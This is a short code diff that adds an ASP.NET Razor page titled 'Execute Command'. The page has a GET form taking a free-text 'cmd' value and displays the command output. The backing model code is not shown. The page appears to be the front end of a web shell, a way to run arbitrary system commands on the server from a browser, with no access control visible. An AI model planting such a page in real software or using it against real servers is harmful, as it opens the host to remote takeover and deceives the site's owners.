@@ -1,0 +1,15 @@
+@page
+@model ExecuteCommandModel
+@{
+    ViewData["Title"] = "Execute Command";
+}
+
+<h1>Execute Command</h1>
+
+<form method="get">
+    <input type="text" name="cmd" placeholder="Enter command" />
+    <input type="submit" value="Execute" />
+</form>
+
+<h2>Output:</h2>
+<pre>@Model.Output</pre>
